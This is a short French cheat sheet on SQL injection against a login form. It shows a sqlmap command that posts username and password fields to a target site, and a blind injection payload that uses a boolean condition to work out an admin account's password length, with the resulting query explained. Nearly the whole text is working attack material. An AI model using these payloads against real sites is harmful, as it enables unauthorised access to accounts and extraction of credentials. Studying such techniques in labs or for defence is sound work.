'''Trouver des infos sur le sgbd avec SQLMAP:'''

#sqlmap -u "le_lien_du_site" --data "username=monloginadmin&password=monmotdepasse"

'''Trouver la longueur d'un mot de passe en blind en connaissant un compte admin:'''

#admin' and (1=0 or length(password)>i)/* -> faire varier i 

#la requête effectuée sera : select * from users where login='admin' and (1=0 or length(password)>i) -> 1=0 étant faux, l'utilisateur se connecte seulement si le 2ème condition est vérifiée
